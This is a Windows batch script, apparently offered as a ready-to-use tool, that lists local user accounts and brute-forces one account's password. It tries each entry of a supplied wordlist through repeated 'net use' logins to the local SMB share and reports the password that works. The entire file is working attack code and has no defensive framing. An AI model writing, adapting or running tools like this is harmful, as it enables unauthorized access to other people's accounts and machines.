@echo off
title User Bruteforce - Enhanced Version
setlocal enabledelayedexpansion
chcp 65001 >nul
:start
cls
set error=-
color F
set user=""
set wordlist=""
color 0A
echo    ╔════════════════════╗
echo    ║  COMMANDS:         ║
echo    ║                    ║
echo    ║  1. List Users     ║
echo    ║  2. Bruteforce     ║
echo    ║  3. Exit           ║
echo    ╚════════════════════╝
:input
set /p "=>> " <nul
choice /c 123 >nul

if /I "%errorlevel%" EQU "1" (
  echo.
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)

if /I "%errorlevel%" EQU "2" (
  goto bruteforce
)

if /I "%errorlevel%" EQU "3" (
  exit
)

:bruteforce
set /a count=1
echo.
echo.
set /p user="Enter target username: " 
echo.
set /p wordlist="Enter password list file: " 
if not exist "%wordlist%" (
  echo. 
  echo [91m[%error%][0m [97mFile not found: %wordlist%[0m 
  pause >nul 
  goto start
)
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [91m[%error%][0m [97mUser doesn't exist: %user%[0m
  pause >nul
  goto start
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :varset
)
echo.
echo [91m[%error%][0m [97mPassword not found in list: %wordlist%[0m
pause >nul
goto start

:success
echo.
echo [92m[+][0m [97mPassword found: %pass%[0m
net use \\127.0.0.1 /d /y >nul 2>&1
set user=
set pass=
echo.
pause >nul
goto start

:varset
net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
echo [ATTEMPT %count%] [%pass%]
set /a count+=1
if /I "%errorlevel%" EQU "0" goto success
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success 
